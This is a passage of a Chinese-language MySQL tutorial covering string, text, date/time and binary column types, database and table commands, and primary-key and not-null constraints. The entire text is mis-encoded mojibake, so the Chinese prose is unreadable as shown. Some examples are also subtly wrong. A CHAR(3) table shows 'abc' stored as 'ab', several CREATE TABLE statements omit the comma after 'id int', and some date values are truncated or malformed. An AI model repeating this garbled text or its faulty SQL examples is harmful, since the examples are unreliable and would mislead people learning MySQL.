<p>ä»ä¸Šå›¾ä¸­å¯ä»¥çœ‹å‡ºï¼šDECIMALç±»å‹çš„å–å€¼èŒƒå›´ä¸DOUBLEç±»å‹ç›¸åŒã€‚ä½†æ˜¯ï¼Œè¯·æ³¨æ„ï¼šDECIMALç±»å‹çš„æœ‰æ•ˆå–å€¼èŒƒå›´æ˜¯ç”±Må’ŒDå†³å®šçš„ã€‚å…¶ä¸­ï¼ŒMè¡¨ç¤ºçš„æ˜¯æ•°æ®çš„é•¿ åº¦ï¼ŒDè¡¨ç¤ºçš„æ˜¯å°æ•°ç‚¹åçš„é•¿åº¦ã€‚æ¯”å¦‚ï¼Œå°†æ•°æ®ç±»å‹ä¸ºDECIMAL(6,2)çš„æ•°æ®6.5243 æ’å…¥æ•°æ®åº“åæ˜¾ç¤ºçš„ç»“æœä¸º6.52</p>
<h3 id="å­—ç¬¦ä¸²ç±»å‹">å­—ç¬¦ä¸²ç±»å‹</h3>
<p>åœ¨MySQLä¸­å¸¸ç”¨CHAR å’Œ VARCHAR è¡¨ç¤ºå­—ç¬¦ä¸²ã€‚ä¸¤è€…ä¸åŒçš„æ˜¯ï¼šVARCHARå­˜å‚¨å¯å˜é•¿åº¦çš„å­—ç¬¦ä¸²ã€‚<br>
<strong>å½“æ•°æ®ä¸ºCHAR(M)ç±»å‹æ—¶ï¼Œä¸ç®¡æ’å…¥å€¼çš„é•¿åº¦æ˜¯å®é™…æ˜¯å¤šå°‘å®ƒæ‰€å ç”¨çš„å­˜å‚¨ç©ºé—´éƒ½æ˜¯Mä¸ªå­—èŠ‚ï¼›è€ŒVARCHAR(M)æ‰€å¯¹åº”çš„æ•°æ®æ‰€å ç”¨çš„å­—èŠ‚æ•°ä¸ºå®é™…é•¿åº¦åŠ 1</strong></p>
<table>
<thead>
<tr>
<th>æ’å…¥å€¼</th>
<th>CHAR(3)</th>
<th>å­˜å‚¨éœ€æ±‚</th>
<th>VARCHAR(3)</th>
<th>å­˜å‚¨éœ€æ±‚</th>
</tr>
</thead>
<tbody>
<tr>
<td>â€˜â€™</td>
<td>â€˜â€™</td>
<td>3ä¸ªå­—èŠ‚</td>
<td>â€˜â€™</td>
<td>1ä¸ªå­—èŠ‚</td>
</tr>
<tr>
<td>â€˜aâ€™</td>
<td>â€˜aâ€™</td>
<td>3ä¸ªå­—èŠ‚</td>
<td>â€˜aâ€™</td>
<td>2ä¸ªå­—èŠ‚</td>
</tr>
<tr>
<td>â€˜abâ€™</td>
<td>â€˜abâ€™</td>
<td>3ä¸ªå­—èŠ‚</td>
<td>â€˜abâ€™</td>
<td>3ä¸ªå­—èŠ‚</td>
</tr>
<tr>
<td>â€˜abcâ€™</td>
<td>â€˜abâ€™</td>
<td>3ä¸ªå­—èŠ‚</td>
<td>â€˜abcâ€™</td>
<td>4ä¸ªå­—èŠ‚</td>
</tr>
<tr>
<td>â€˜abcdâ€™</td>
<td>â€˜abâ€™</td>
<td>3ä¸ªå­—èŠ‚</td>
<td>â€˜abcâ€™</td>
<td>4å­—èŠ‚</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>CHAR(M)</th>
<th>Mä¸º0~255ä¹‹é—´çš„æ•´æ•°ï¼Œå›ºå®šé•¿åº¦ä¸ºMï¼Œä¸è¶³åé¢è¡¥å…¨ç©ºæ ¼</th>
</tr>
</thead>
<tbody>
<tr>
<td>VARCHAR(M)</td>
<td>Mä¸º0~65535ä¹‹é—´çš„æ•´æ•°</td>
</tr>
</tbody>
</table>
<h3 id="æ–‡æœ¬ç±»å‹">æ–‡æœ¬ç±»å‹</h3>
<p>æ–‡æœ¬ç±»å‹ç”¨äºè¡¨ç¤ºå¤§æ–‡æœ¬æ•°æ®ï¼Œä¾‹å¦‚ï¼Œæ–‡ç« å†…å®¹ã€è¯„è®ºã€è¯¦æƒ…ç­‰ï¼Œå®ƒçš„ç±»å‹åˆ†ä¸ºå¦‚ä¸‹4ç§ï¼š</p>
<table>
<thead>
<tr>
<th>æ•°æ®ç±»å‹</th>
<th>å‚¨å­˜èŒƒå›´</th>
</tr>
</thead>
<tbody>
<tr>
<td>TINYTEXT</td>
<td>0~255å­—èŠ‚</td>
</tr>
<tr>
<td>TEXT</td>
<td>0~65535å­—èŠ‚</td>
</tr>
<tr>
<td>MEDIUMTEXT</td>
<td>0~16777215å­—èŠ‚</td>
</tr>
<tr>
<td>LONGTEXT</td>
<td>0~4294967295å­—èŠ‚</td>
</tr>
<tr>
<td>TINYBLOB</td>
<td>0~255å­—èŠ‚</td>
</tr>
<tr>
<td>BLOB</td>
<td>0~65535å­—èŠ‚</td>
</tr>
<tr>
<td>MEDIUMBLOB</td>
<td>0~16777215å­—èŠ‚</td>
</tr>
<tr>
<td>LONGBLOB</td>
<td>0~4294967295å­—èŠ‚</td>
</tr>
<tr>
<td>VARBINARY(M)</td>
<td>å…è®¸é•¿åº¦0~Mä¸ªå­—èŠ‚çš„å˜é•¿å­—èŠ‚å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td>BINARY(M)</td>
<td>å…è®¸é•¿åº¦0~Mä¸ªå­—èŠ‚çš„å®šé•¿å­—èŠ‚å­—ç¬¦ä¸²</td>
</tr>
</tbody>
</table>
<h3 id="æ—¥æœŸä¸æ—¶é—´ç±»å‹">æ—¥æœŸä¸æ—¶é—´ç±»å‹</h3>
<p>MySQLæä¾›çš„è¡¨ç¤ºæ—¥æœŸå’Œæ—¶é—´çš„æ•°æ®ç±»å‹åˆ†åˆ«æ˜¯ ï¼šYEARã€DATEã€TIMEã€DATETIME å’Œ TIMESTAMPã€‚ä¸‹å›¾åˆ—ä¸¾äº†æ—¥æœŸå’Œæ—¶é—´æ•°æ®ç±»å‹æ‰€å¯¹åº”çš„å­—èŠ‚æ•°ã€å–å€¼èŒƒå›´ã€æ—¥æœŸæ ¼å¼ä»¥åŠé›¶å€¼ï¼š</p>
<table>
<thead>
<tr>
<th>æ•°æ®ç±»å‹</th>
<th>å­—èŠ‚æ•°</th>
<th>å–å€¼èŒƒå›´</th>
<th>æ—¥æœŸæ ¼å¼</th>
<th>é›¶å€¼</th>
</tr>
</thead>
<tbody>
<tr>
<td>YEAR</td>
<td>1</td>
<td>1901~2155</td>
<td>YYYY</td>
<td>0000</td>
</tr>
<tr>
<td>DATE</td>
<td>4</td>
<td>1000-01-01~9999-12-31</td>
<td>YYYY-MM-DD</td>
<td>0000-00-00</td>
</tr>
<tr>
<td>TIME</td>
<td>3</td>
<td>-838ï¼š59ï¼š59~ 838ï¼š59ï¼š59</td>
<td>HH:MM:SS</td>
<td>00:00:00</td>
</tr>
<tr>
<td>DATETIME</td>
<td>8</td>
<td>1000-01-01 00:00:00~9999-12-31 23:59:59</td>
<td>YYYY-MM-DD HH:MM:SS</td>
<td>0000-00-00 00:00:00</td>
</tr>
<tr>
<td>TIMESTAMP</td>
<td>4</td>
<td>1970-01-01 00:00:01~2038-01-19 03:14:07</td>
<td>YYYY-MM-DD HH:MM:SS</td>
<td>0000-00-00 00:00:00</td>
</tr>
</tbody>
</table>
<ul class="lvl-0">
<li class="lvl-2">
<p>YEAR<strong>ç±»å‹</strong></p>
</li>
</ul>
<p>YEARç±»å‹ç”¨äºè¡¨ç¤ºå¹´ä»½ï¼Œåœ¨MySQLä¸­ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹ä¸‰ç§æ ¼å¼æŒ‡å®šYEARç±»å‹ çš„å€¼ã€‚<br>
1ã€ä½¿ç”¨4ä½å­—ç¬¦ä¸²æˆ–æ•°å­—è¡¨ç¤ºï¼ŒèŒƒå›´ä¸ºâ€™1901â€™â€”'2155â€™æˆ–1901â€”2155ã€‚ä¾‹å¦‚ï¼Œè¾“å…¥ â€˜2019â€™æˆ–2019æ’å…¥åˆ°æ•°æ®åº“ä¸­çš„å€¼å‡ä¸º2019ã€‚<br>
2ã€ä½¿ç”¨ä¸¤ä½å­—ç¬¦ä¸²è¡¨ç¤ºï¼ŒèŒƒå›´ä¸ºâ€™00â€™â€”â€˜99â€™ã€‚å…¶ä¸­ï¼Œâ€˜00â€™â€”'69â€™èŒƒå›´çš„å€¼ä¼šè¢«è½¬æ¢ä¸º 2000â€”2069èŒƒå›´çš„YEARå€¼ï¼Œâ€˜70â€™â€”'99â€™èŒƒå›´çš„å€¼ä¼šè¢«è½¬æ¢ä¸º1970â€”1999èŒƒå›´çš„YEAR å€¼ã€‚ä¾‹å¦‚ï¼Œè¾“å…¥â€™19â€™æ’å…¥åˆ°æ•°æ®åº“ä¸­çš„å€¼ä¸º2019ã€‚<br>
3ã€ä½¿ç”¨ä¸¤ä½æ•°å­—è¡¨ç¤ºï¼ŒèŒƒå›´ä¸º1â€”99ã€‚å…¶ä¸­ï¼Œ1â€”69èŒƒå›´çš„å€¼ä¼šè¢«è½¬æ¢ä¸º2001â€” 2069èŒƒå›´çš„YEARå€¼ï¼Œ70â€”99èŒƒå›´çš„å€¼ä¼šè¢«è½¬æ¢ä¸º1970â€”1999èŒƒå›´çš„YEARå€¼ã€‚ä¾‹ å¦‚ï¼Œè¾“å…¥19æ’å…¥åˆ°æ•°æ®åº“ä¸­çš„å€¼ä¸º2019ã€‚è¯·æ³¨æ„ï¼šå½“ä½¿ç”¨YEARç±»å‹æ—¶ï¼Œä¸€å®šè¦åŒºåˆ†â€™0â€™å’Œ0ã€‚å› ä¸ºå­—ç¬¦ä¸²æ ¼å¼çš„â€™0â€™è¡¨ç¤ºçš„YEARå€¼æ˜¯2000è€Œæ•°å­—æ ¼å¼çš„0è¡¨ç¤ºçš„YEARå€¼æ˜¯0000ã€‚</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>TIME<strong>ç±»å‹</strong></p>
</li>
</ul>
<p>TIMEç±»å‹ç”¨äºè¡¨ç¤ºæ—¶é—´å€¼ï¼Œå®ƒçš„æ˜¾ç¤ºå½¢å¼ä¸€èˆ¬ä¸ºHH:MM:SSï¼Œå…¶ä¸­ï¼ŒHHè¡¨ç¤ºå°æ—¶ï¼Œ MMè¡¨ç¤ºåˆ†,SSè¡¨ç¤ºç§’ã€‚åœ¨MySQLä¸­ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹3ç§æ ¼å¼æŒ‡å®šTIMEç±»å‹çš„å€¼ã€‚<br>
1ã€ä»¥â€™D HH:MM:SSâ€™å­—ç¬¦ä¸²æ ¼å¼è¡¨ç¤ºã€‚å…¶ä¸­ï¼ŒDè¡¨ç¤ºæ—¥å¯å–0â€”34ä¹‹é—´çš„å€¼, æ’å…¥æ•°æ®æ—¶ï¼Œå°æ—¶çš„å€¼ç­‰äº(DX24+HH)ã€‚ä¾‹å¦‚ï¼Œè¾“å…¥â€™2 11:30:50â€™æ’å…¥æ•°æ®åº“ä¸­çš„æ—¥æœŸä¸º59:30:50ã€‚<br>
2ã€ä»¥â€™HHMMSSâ€™å­—ç¬¦ä¸²æ ¼å¼æˆ–è€…HHMMSSæ•°å­—æ ¼å¼è¡¨ç¤ºã€‚ ä¾‹å¦‚ï¼Œè¾“å…¥â€™115454â€™æˆ–115454,æ’å…¥æ•°æ®åº“ä¸­çš„æ—¥æœŸä¸º11:54:54<br>
3ã€ä½¿ç”¨CURRENT_TIMEæˆ–NOW()è¾“å…¥å½“å‰ç³»ç»Ÿæ—¶é—´ã€‚</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>DATETIMEç±»å‹</p>
</li>
</ul>
<p>DATETIMEç±»å‹ç”¨äºè¡¨ç¤ºæ—¥æœŸå’Œæ—¶é—´ï¼Œå®ƒçš„æ˜¾ç¤ºå½¢å¼ä¸ºâ€™YYYY-MM-DD HH: MM:SSâ€™ï¼Œå…¶ä¸­ï¼ŒYYYYè¡¨ç¤ºå¹´ï¼ŒMMè¡¨ç¤ºæœˆï¼ŒDDè¡¨ç¤ºæ—¥ï¼ŒHHè¡¨ç¤ºå°æ—¶ï¼ŒMMè¡¨ç¤ºåˆ†ï¼ŒSS è¡¨ç¤ºç§’ã€‚åœ¨MySQLä¸­ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹4ç§æ ¼å¼æŒ‡å®šDATETIMEç±»å‹çš„å€¼ã€‚<br>
ï‚·ä»¥â€™YYYY-MM-DD HH:MM:SSâ€™æˆ–è€…â€™YYYYMMDDHHMMSSâ€™å­—ç¬¦ä¸²æ ¼å¼è¡¨ç¤ºçš„æ—¥æœŸå’Œæ—¶é—´ï¼Œå–å€¼èŒƒå›´ä¸ºâ€™1000-01-01 00:00:00â€™â€”â€˜9999-12-3 23:59:59â€™ã€‚ä¾‹å¦‚ï¼Œè¾“å…¥â€™2019-01-22 09:01:23â€™æˆ– â€˜20140122_0_90123â€™æ’å…¥æ•°æ®åº“ä¸­çš„ DATETIME å€¼éƒ½ä¸º 2019-01-22 09:01:23ã€‚<br>
1ã€ä»¥â€™YY-MM-DD HH:MM:SSâ€™æˆ–è€…â€™YYMMDDHHMMSSâ€™å­—ç¬¦ä¸²æ ¼å¼è¡¨ç¤ºçš„æ—¥æœŸå’Œæ—¶é—´ï¼Œå…¶ä¸­YYè¡¨ç¤ºå¹´ï¼Œå–å€¼èŒƒå›´ä¸ºâ€™00â€™â€”â€˜99â€™ã€‚ä¸DATEç±»å‹ä¸­çš„YYç›¸åŒï¼Œâ€˜00â€™â€” '69â€™èŒƒå›´çš„å€¼ä¼šè¢«è½¬æ¢ä¸º2000â€”2069èŒƒå›´çš„å€¼ï¼Œâ€˜70â€™â€”'99â€™èŒƒå›´çš„å€¼ä¼šè¢«è½¬æ¢ä¸º1970â€”1999èŒƒå›´çš„å€¼ã€‚<br>
2ã€ä»¥YYYYMMDDHHMMSSæˆ–è€…YYMMDDHHMMSSæ•°å­—æ ¼å¼è¡¨ç¤ºçš„æ—¥æœŸ å’Œæ—¶é—´ã€‚ä¾‹å¦‚ï¼Œæ’å…¥20190122090123æˆ–è€…190122090123,æ’å…¥æ•°æ®åº“ä¸­çš„DATETIMEå€¼éƒ½ ä¸º 2019-01-22 09:01:23ã€‚<br>
3ã€ä½¿ç”¨NOWæ¥è¾“å…¥å½“å‰ç³»ç»Ÿçš„æ—¥æœŸå’Œæ—¶é—´ã€‚</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>TIMESTAMPç±»å‹</p>
</li>
</ul>
<p>TIMESTAMPç±»å‹ç”¨äºè¡¨ç¤ºæ—¥æœŸå’Œæ—¶é—´ï¼Œå®ƒçš„æ˜¾ç¤ºå½¢å¼ä¸DATETIMEç›¸åŒä½†å–å€¼èŒƒå›´æ¯”DATETIMEå°ã€‚åœ¨æ­¤ï¼Œä»‹ç»å‡ ç§TIMESTAMPç±»å‹ä¸DATATIMEç±»å‹ä¸åŒçš„å½¢å¼ï¼š<br>
1ã€ä½¿ç”¨CURRENT_TIMESTAMPè¾“å…¥ç³»ç»Ÿå½“å‰æ—¥æœŸå’Œæ—¶é—´ã€‚<br>
2ã€è¾“å…¥NULLæ—¶ç³»ç»Ÿä¼šè¾“å…¥ç³»ç»Ÿå½“å‰æ—¥æœŸå’Œæ—¶é—´ã€‚<br>
3ã€æ— ä»»ä½•è¾“å…¥æ—¶ç³»ç»Ÿä¼šè¾“å…¥ç³»ç»Ÿå½“å‰æ—¥æœŸå’Œæ—¶é—´ã€‚</p>
<h3 id="äºŒè¿›åˆ¶ç±»å‹">äºŒè¿›åˆ¶ç±»å‹</h3>
<p>åœ¨MySQLä¸­å¸¸ç”¨BLOBå­˜å‚¨äºŒè¿›åˆ¶ç±»å‹çš„æ•°æ®ï¼Œä¾‹å¦‚ï¼šå›¾ç‰‡ã€PDFæ–‡æ¡£ç­‰ã€‚BLOBç±»å‹åˆ†ä¸ºå¦‚ä¸‹å››ç§ï¼š</p>
<table>
<thead>
<tr>
<th>æ•°æ®ç±»å‹</th>
<th>å‚¨å­˜èŒƒå›´</th>
</tr>
</thead>
<tbody>
<tr>
<td>TINYBLOB</td>
<td>0~255å­—èŠ‚</td>
</tr>
<tr>
<td>BLOB</td>
<td>0~65535å­—èŠ‚</td>
</tr>
<tr>
<td>MEDIUMBLOB</td>
<td>0~16777215å­—èŠ‚</td>
</tr>
<tr>
<td>LONGBLOB</td>
<td>0~4294967295å­—èŠ‚</td>
</tr>
</tbody>
</table>
<h2 id="æ•°æ®åº“ã€æ•°æ®è¡¨çš„åŸºæœ¬æ“ä½œ">æ•°æ®åº“ã€æ•°æ®è¡¨çš„åŸºæœ¬æ“ä½œ</h2>
<h3 id="æ•°æ®åº“çš„åŸºæœ¬æ“ä½œ">æ•°æ®åº“çš„åŸºæœ¬æ“ä½œ</h3>
<p>æŸ¥è¯¢æ•°æ®åº“çš„ç‰ˆæœ¬ï¼ˆæ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼‰ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@version</span> </span><br></pre></td></tr></table></figure>
<p>MySQLå®‰è£…å®Œæˆåï¼Œè¦æƒ³å°†æ•°æ®å­˜å‚¨åˆ°æ•°æ®åº“çš„è¡¨ä¸­ï¼Œé¦–å…ˆè¦åˆ›å»ºä¸€ä¸ªæ•°æ®åº“ã€‚åˆ›å»ºæ•°æ®åº“å°±æ˜¯åœ¨æ•°æ®åº“ç³»ç»Ÿä¸­åˆ’åˆ†ä¸€å—ç©ºé—´å­˜å‚¨æ•°æ®ï¼Œè¯­æ³•å¦‚ä¸‹ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">åˆ›å»ºæ•°æ®åº“</span><br><span class="line"><span class="keyword">create</span> database æ•°æ®åº“åç§°;</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>åˆ›å»ºä¸€ä¸ªå«db1çš„æ•°æ®åº“MySQLå‘½ä»¤ï¼š</span><br><span class="line"><span class="keyword">create</span> database db1;</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>åˆ›å»ºæ•°æ®åº“åæŸ¥çœ‹è¯¥æ•°æ®åº“åŸºæœ¬ä¿¡æ¯MySQLå‘½ä»¤ï¼š</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">create</span> database db1;</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>æŸ¥è¯¢å‡ºMySQLä¸­æ‰€æœ‰çš„æ•°æ®åº“MySQLå‘½ä»¤ï¼š</span><br><span class="line"><span class="keyword">show</span> databases;</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>å°†æ•°æ®åº“çš„å­—ç¬¦é›†ä¿®æ”¹ä¸ºgbk MySQLå‘½ä»¤ï¼š</span><br><span class="line"><span class="keyword">alter</span> database db1 <span class="type">character</span> <span class="keyword">set</span> gbk;</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span>åˆ‡æ¢æ•°æ®åº“ MySQLå‘½ä»¤ï¼š</span><br><span class="line">use db1;</span><br><span class="line"></span><br><span class="line"><span class="number">6.</span>æŸ¥çœ‹å½“å‰ä½¿ç”¨çš„æ•°æ®åº“ MySQLå‘½ä»¤ï¼š</span><br><span class="line"><span class="keyword">select</span> database();</span><br><span class="line"></span><br><span class="line"><span class="number">7.</span>åˆ é™¤æ•°æ®åº“MySQLå‘½ä»¤ï¼š</span><br><span class="line"><span class="keyword">drop</span> database db1;</span><br><span class="line"></span><br><span class="line"><span class="number">8.</span>é€€å‡ºæ•°æ®åº“</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>
<h3 id="æ•°æ®è¡¨çš„åŸºæœ¬æ“ä½œ">æ•°æ®è¡¨çš„åŸºæœ¬æ“ä½œ</h3>
<p>æ•°æ®åº“åˆ›å»ºæˆåŠŸåå¯åœ¨è¯¥æ•°æ®åº“ä¸­åˆ›å»ºæ•°æ®è¡¨(ç®€ç§°ä¸ºè¡¨)å­˜å‚¨æ•°æ®ã€‚</p>
<p><font class="notice">è¯·æ³¨æ„ï¼šåœ¨æ“ä½œæ•°æ®è¡¨ä¹‹å‰åº”ä½¿ç”¨â€œUSE æ•°æ®åº“å;â€æŒ‡å®šæ“ä½œæ˜¯åœ¨å“ªä¸ªæ•°æ®åº“ä¸­è¿›è¡Œå…ˆå…³æ“ä½œï¼Œå¦åˆ™ä¼šæŠ›å‡ºâ€œNo database selectedâ€é”™è¯¯ã€‚<br>å­—æ®µé¦–å­—ç¬¦å¿…é¡»æ˜¯å­—æ¯æˆ–<code>_</code>ï¼Œä¸èƒ½æ˜¯æ•°å­—æˆ–è€…å…¶ä»–å­—ç¬¦</font></p>

<p>è¯­æ³•å¦‚ä¸‹ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">create</span> <span class="keyword">table</span> è¡¨å(</span><br><span class="line">         å­—æ®µ<span class="number">1</span> å­—æ®µç±»å‹,</span><br><span class="line">         å­—æ®µ<span class="number">2</span> å­—æ®µç±»å‹,</span><br><span class="line">         â€¦</span><br><span class="line">         å­—æ®µn å­—æ®µç±»å‹</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><figcaption><span>è¡¨ç¤ºä¾‹</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>åˆ›å»ºå­¦ç”Ÿè¡¨ MySQLå‘½ä»¤ï¼š</span><br><span class="line"> <span class="keyword">create</span> <span class="keyword">table</span> student(</span><br><span class="line"> id <span class="type">int</span>,</span><br><span class="line"> name <span class="type">varchar</span>(<span class="number">20</span>),</span><br><span class="line"> gender <span class="type">varchar</span>(<span class="number">10</span>),</span><br><span class="line"> birthday <span class="type">date</span></span><br><span class="line"> );</span><br><span class="line"> </span><br><span class="line"><span class="number">2.</span>æŸ¥çœ‹å½“å‰æ•°æ®åº“ä¸­æ‰€æœ‰è¡¨</span><br><span class="line"><span class="keyword">show</span> tables;</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>æŸ¥è¡¨çš„åŸºæœ¬ä¿¡æ¯</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">table</span> student;</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>æŸ¥çœ‹è¡¨çš„å­—æ®µä¿¡æ¯</span><br><span class="line"><span class="keyword">desc</span> student;</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span>ä¿®æ”¹è¡¨å</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> student rename <span class="keyword">to</span> stu;</span><br><span class="line">rename <span class="keyword">table</span> student <span class="keyword">to</span> stu;</span><br><span class="line"></span><br><span class="line"><span class="number">6.</span>ä¿®æ”¹å­—æ®µå</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> stu change name sname <span class="type">varchar</span>(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="number">7.</span>ä¿®æ”¹å­—æ®µæ•°æ®ç±»å‹</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> stu modify sname <span class="type">int</span>;</span><br><span class="line"></span><br><span class="line"><span class="number">8.</span>å¢åŠ å­—æ®µ</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> stu <span class="keyword">add</span> address <span class="type">varchar</span>(<span class="number">50</span>);</span><br><span class="line"></span><br><span class="line"><span class="number">9.</span>åˆ é™¤å­—æ®µ</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> stu <span class="keyword">drop</span> address;</span><br><span class="line"></span><br><span class="line"><span class="number">10.</span>åˆ é™¤æ•°æ®è¡¨</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> stu;</span><br><span class="line"></span><br><span class="line"><span class="number">11.</span>ä¿®æ”¹å­—æ®µaåˆ°å­—æ®µbå(ä¸çŸ¥é“æ‹¬ä¸­å·é‡Œå¯ä¸å¯ä»¥)</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> stu modify å­—æ®µb [ç±»å‹] after å­—æ®µa</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> stu modify å­—æ®µb [å­—æ®µc ç±»å‹] after å­—æ®µa</span><br></pre></td></tr></table></figure>
<h2 id="æ•°æ®è¡¨çš„çº¦æŸ">æ•°æ®è¡¨çš„çº¦æŸ</h2>
<p>ä¸ºé˜²æ­¢é”™è¯¯çš„æ•°æ®è¢«æ’å…¥åˆ°æ•°æ®è¡¨ï¼ŒMySQLä¸­å®šä¹‰äº†ä¸€äº›ç»´æŠ¤æ•°æ®åº“å®Œæ•´æ€§çš„è§„åˆ™ï¼›è¿™äº›è§„åˆ™å¸¸ç§°ä¸ºè¡¨çš„çº¦æŸã€‚å¸¸è§çº¦æŸå¦‚ä¸‹ï¼š</p>
<table>
<thead>
<tr>
<th>çº¦æŸæ¡ä»¶</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
<td>PRIMARY KEY</td>
<td>ä¸»é”®çº¦æŸç”¨äºå”¯ä¸€æ ‡è¯†å¯¹åº”çš„è®°å½•</td>
</tr>
<tr>
<td>FOREIGN KEY</td>
<td>å¤–é”®çº¦æŸ</td>
</tr>
<tr>
<td>NOT NULL</td>
<td>éç©ºçº¦æŸ</td>
</tr>
<tr>
<td>UNIQUE</td>
<td>å”¯ä¸€æ€§çº¦æŸ</td>
</tr>
<tr>
<td>DEFAULT</td>
<td>é»˜è®¤å€¼çº¦æŸï¼Œç”¨äºè®¾ç½®å­—æ®µçš„é»˜è®¤å€¼</td>
</tr>
</tbody>
</table>
<p>ä»¥ä¸Šäº”ç§çº¦æŸæ¡ä»¶é’ˆå¯¹è¡¨ä¸­å­—æ®µè¿›è¡Œé™åˆ¶ä»è€Œä¿è¯æ•°æ®è¡¨ä¸­æ•°æ®çš„æ­£ç¡®æ€§å’Œå”¯ä¸€æ€§ã€‚æ¢å¥è¯è¯´ï¼Œè¡¨çš„çº¦æŸå®é™…ä¸Šå°±æ˜¯è¡¨ä¸­æ•°æ®çš„é™åˆ¶æ¡ä»¶ã€‚</p>
<h3 id="ä¸»é”®çº¦æŸ">ä¸»é”®çº¦æŸ</h3>
<p>ä¸»é”®çº¦æŸå³primary keyç”¨äºå”¯ä¸€çš„æ ‡è¯†è¡¨ä¸­çš„æ¯ä¸€è¡Œã€‚è¢«æ ‡è¯†ä¸ºä¸»é”®çš„æ•°æ®åœ¨è¡¨ä¸­æ˜¯å”¯ä¸€çš„ä¸”å…¶å€¼ä¸èƒ½ä¸ºç©ºã€‚è¿™ç‚¹ç±»ä¼¼äºæˆ‘ä»¬æ¯ä¸ªäººéƒ½æœ‰ä¸€ä¸ªèº«ä»½è¯å·ï¼Œå¹¶ä¸”è¿™ä¸ªèº«ä»½è¯å·æ˜¯å”¯ä¸€çš„ã€‚ ä¸»é”®çº¦æŸåŸºæœ¬è¯­æ³•ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">å­—æ®µå æ•°æ®ç±»å‹ <span class="keyword">primary</span> key;</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><figcaption><span>ä¸»é”®çº¦æŸç¤ºä¾‹</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>è®¾ç½®ä¸»é”®çº¦æŸ(<span class="keyword">primary</span> key)çš„ç¬¬ä¸€ç§æ–¹å¼<span class="keyword">create</span> <span class="keyword">table</span> student(</span><br><span class="line">id <span class="type">int</span> <span class="keyword">primary</span> key,</span><br><span class="line">name <span class="type">varchar</span>(<span class="number">20</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> è®¾ç½®ä¸»é”®çº¦æŸ(<span class="keyword">primary</span> key)çš„ç¬¬äºŒÂ·ç§æ–¹å¼</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> student01(</span><br><span class="line">id <span class="type">int</span></span><br><span class="line">name <span class="type">varchar</span>(<span class="number">20</span>),</span><br><span class="line"><span class="keyword">primary</span> key(id)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>å¯ä½¿ç”¨<code>desc student01</code>å‘½ä»¤æŸ¥è¯¢</p>
<h3 id="éç©ºçº¦æŸ">éç©ºçº¦æŸ</h3>
<p>éç©ºçº¦æŸå³ NOT NULLæŒ‡çš„æ˜¯å­—æ®µçš„å€¼ä¸èƒ½ä¸ºç©ºï¼ŒåŸºæœ¬çš„è¯­æ³•æ ¼å¼å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">å­—æ®µå æ•°æ®ç±»å‹ <span class="keyword">NOT</span> <span class="keyword">NULL</span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><figcaption><span>éç©ºçº¦æŸç¤ºä¾‹</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> student02(</span><br><span class="line">id <span class="type">int</span></span><br><span class="line">name <span class="type">varchar</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="keyword">null</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<h3 id="é»˜è®¤å€¼çº¦æŸ">é»˜è®¤å€¼çº¦æŸ</h3>
